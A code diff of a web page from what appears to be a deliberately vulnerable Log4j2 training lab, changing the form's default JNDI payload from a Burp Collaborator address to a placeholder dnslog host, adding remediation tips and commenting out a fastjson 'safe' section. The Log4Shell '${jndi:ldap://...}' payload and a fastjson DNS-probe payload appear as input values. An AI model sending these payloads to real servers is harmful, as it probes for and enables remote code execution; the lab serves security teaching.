@@ -27,10 +27,10 @@
                             <div class="layui-tab-content">
                                 <div class="layui-tab-item layui-show">
                                     <blockquote class="layui-elem-quote main_btn">
-                                        <form class="layui-form" id="vul-log4j2-form"
+                                        <form class="layui-form" id="vul-log4j2-form" th:action="@{/log4j2/vul}" method="post"
                                               style="display: flex; justify-content: space-between;">
-                                            <input name="payload" type="text" style="width: 450px;"
-                                                   value='${jndi:ldap://vul.5cikvpzkcpk11hycgky8buc970dr1ip7.oastify.com/test}'
+                                            <input type="text" style="width: 450px;" name="payload"
+                                                   value='${jndi:ldap://此处替换为dnslog地址/test}'
                                                    autocomplete="off"
                                                    class="layui-input" id="vul-log4j2-input">
                                             <div style="display: flex; align-items: center;">
@@ -49,21 +49,13 @@
                                         <div class="layui-card-header"><i class="fa fa-bullhorn icon-tip"></i>tips</div>
                                         <div class="layui-card-body layui-text layadmin-text">
                                             <pre style="color: #28333e;font-size: 15px;">漏洞原理：
-  log4j2在日志输出中，一旦在log字符串中检测到${}，就会调用lookup查询尝试解析其中的字符串，如果未对字符合法性进行严格的限制，攻击者构造恶意的URL地址让其解析，利用 JNDI协议加载的远程恶意脚本，从而造成RCE。</pre>
+  log4j2在日志输出中，一旦在log字符串中检测到${}，就会调用lookup查询尝试解析其中的字符串，如果未对字符合法性进行严格的限制，攻击者构造恶意的URL地址让其解析，利用 JNDI协议加载的远程恶意脚本，从而造成RCE。
+安全编码规范：
+升级方案：升级Log4j至2.15.0及以上稳定版本
+临时缓解：修改配置文件log4j2.component.propertieslog4j2.formatMsgNoLookups=True</pre>
                                         </div>
                                     </div>
                                 </div>
-
-                                <div class="layui-col-md12">
-                                    <div class="layui-card">
-                                        <div class="layui-card-header"><i class="fa fa-warning icon-output"></i>测试结果
-                                        </div>
-                                        <div class="layui-card-body layui-text layadmin-text">
-                                            <pre id="vul-log4j2-result" style="color: red;font-size: 15px;"></pre>
-                                        </div>
-                                    </div>
-                                </div>
-
                             </div>
                         </div>
                     </div>
@@ -77,66 +69,66 @@
                 </div>
             </div>
 
-            <div class="layui-col-md12" style="margin-top: 10px">
-                <div class="layui-row layui-col-space15">
-                    <div class="layui-col-md6">
-                        <h1><span class="iconfont icon-anquan"> 安全环境</span></h1>
-                        <div class="layui-tab layui-tab-brief">
-                            <div class="layui-tab-content">
-                                <div class="layui-tab-item layui-show">
-                                    <blockquote class="layui-elem-quote main_btn">
-                                        <form class="layui-form" id="safe-fastjson-form"
-                                              style="display: flex; justify-content: space-between;">
-                                            <input type="text" style="width: 450px;"
-                                                   value='{"test":{"@type":"java.net.Inet4Address","val":"dnslog.com"}}'
-                                                   autocomplete="off"
-                                                   class="layui-input" id="safe-log4j2-input">
-                                            <div style="display: flex; align-items: center;">
-                                                <button class="layui-btn layui-btn-normal"
-                                                        style="width: 100px; margin-left: 10px;"
-                                                        lay-filter="safe-log4j2-submit" lay-submit="">
-                                                    <span class="iconfont icon-zhihang">Run</span>
-                                                </button>
-                                            </div>
-                                        </form>
-                                    </blockquote>
-                                </div>
+<!--            <div class="layui-col-md12" style="margin-top: 10px">-->
+<!--                <div class="layui-row layui-col-space15">-->
+<!--                    <div class="layui-col-md6">-->
+<!--                        <h1><span class="iconfont icon-anquan"> 安全环境</span></h1>-->
+<!--                        <div class="layui-tab layui-tab-brief">-->
+<!--                            <div class="layui-tab-content">-->
+<!--                                <div class="layui-tab-item layui-show">-->
+<!--                                    <blockquote class="layui-elem-quote main_btn">-->
+<!--                                        <form class="layui-form" id="safe-fastjson-form" th:action="@{/log4j2/vul}" method="post"-->
+<!--                                              style="display: flex; justify-content: space-between;">-->
+<!--                                            <input type="text" style="width: 450px;" name="payload"-->
+<!--                                                   value='${jndi:ldap://此处替换为dnslog地址/test}'-->
+<!--                                                   autocomplete="off"-->
+<!--                                                   class="layui-input" id="safe-log4j2-input">-->
+<!--                                            <div style="display: flex; align-items: center;">-->
+<!--                                                <button class="layui-btn layui-btn-normal"-->
+<!--                                                        style="width: 100px; margin-left: 10px;"-->
+<!--                                                        lay-filter="safe-log4j2-submit" lay-submit="">-->
+<!--                                                    <span class="iconfont icon-zhihang">Run</span>-->
+<!--                                                </button>-->
+<!--                                            </div>-->
+<!--                                        </form>-->
+<!--                                    </blockquote>-->
+<!--                                </div>-->
 
-                                <div class="layui-col-md12">
-                                    <div class="layui-card">
-                                        <div class="layui-card-header"><i class="fa fa-bullhorn icon-tip"></i>tips</div>
-                                        <div class="layui-card-body layui-text layadmin-text">
-                                            <pre style="color: #28333e;font-size: 15px;">安全编码规范:
-    1、升级版本至1.2.83及以上
-    2、禁用AutoType或者是设置特定类白名单进行反序列化
-    3、使用SafeMode模式
-    4、使用@JSONType注解限制类的反序列化</pre>
-                                        </div>
-                                    </div>
-                                </div>
+<!--                                <div class="layui-col-md12">-->
+<!--                                    <div class="layui-card">-->
+<!--                                        <div class="layui-card-header"><i class="fa fa-bullhorn icon-tip"></i>tips</div>-->
+<!--                                        <div class="layui-card-body layui-text layadmin-text">-->
+<!--                                            <pre style="color: #28333e;font-size: 15px;">安全编码规范:-->
+<!--    1、升级版本至1.2.83及以上-->
+<!--    2、禁用AutoType或者是设置特定类白名单进行反序列化-->
+<!--    3、使用SafeMode模式-->
+<!--    4、使用@JSONType注解限制类的反序列化</pre>-->
+<!--                                        </div>-->
+<!--                                    </div>-->
+<!--                                </div>-->
 
-                                <div class="layui-col-md12">
-                                    <div class="layui-card">
-                                        <div class="layui-card-header"><i class="fa fa-warning icon-output"></i>测试结果
-                                        </div>
-                                        <div class="layui-card-body layui-text layadmin-text">
-                                            <pre id="safe-log4j2-result" style="color: red;font-size: 15px;"></pre>
-                                        </div>
-                                    </div>
-                                </div>
+<!--                                <div class="layui-col-md12">-->
+<!--                                    <div class="layui-card">-->
+<!--                                        <div class="layui-card-header"><i class="fa fa-warning icon-output"></i>测试结果-->
+<!--                                        </div>-->
+<!--                                        <div class="layui-card-body layui-text layadmin-text">-->
+<!--                                            <pre id="safe-log4j2-result" style="color: red;font-size: 15px;"></pre>-->
+<!--                                        </div>-->
+<!--                                    </div>-->
+<!--                                </div>-->
 
-                            </div>
-                        </div>
-                    </div>
+<!--                            </div>-->
+<!--                        </div>-->
+<!--                    </div>-->
 
-                    <div class="layui-col-md6">
-                        <h1><span class="iconfont icon-code"> 安全代码</span></h1>
-                        <div class="m-auto div-shadow shadow p-3 mb-5 bg-white rounded">
-                            <div class="code-editor" id="safeLog4j2"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
+<!--                    <div class="layui-col-md6">-->
+<!--                        <h1><span class="iconfont icon-code"> 安全代码</span></h1>-->
+<!--                        <div class="m-auto div-shadow shadow p-3 mb-5 bg-white rounded">-->
+<!--                            <div class="code-editor" id="safeLog4j2"></div>-->
+<!--                        </div>-->
+<!--                    </div>-->
+<!--                </div>-->
+<!--            </div>-->
 
         </div>
     </div>
@@ -185,40 +177,6 @@
             CodeMirror(document.getElementById("safeLog4j2"), Object.assign({}, cmConfigSafe, {
                 value: safeLog4j2
             }));
-
-            // 表单提交的通用函数
-            function handleFormSubmit(url, inputSelector, outputSelector) {
-                var content = $(inputSelector).val();
-                if (content.length === 0) {
-                    layer.msg("输入内容不能为空！");
-                    return false; // 阻止表单提交
-                }
-
-                $.ajax({
-                    url: url,
-                    type: "POST",
-                    contentType: "application/json",
-                    data: content, // 直接发送输入的内容
-                    success: function (result) {
-                        console.log(result)
-                        $(outputSelector).empty();
-                        $(outputSelector).append(result);
-                    },
-                    error: function () {
-                        layer.alert("请求发送失败！");
-                    },
-                });
-
-                return false; // 阻止表单默认提交行为
-            }
-
-            form.on('submit(vul-log4j2-submit)', function (data) {
-                return handleFormSubmit("[[@{/log4j2/vul}]]", "#vul-log4j2-input", "#vul-log4j2-result");
-            });
-
-            form.on('submit(safe-log4j2-submit)', function (data) {
-                return handleFormSubmit("[[@{/log4j2/safe}]]", "#safe-log4j2-input", "#safe-log4j2-result");
-            });
 
         });
 
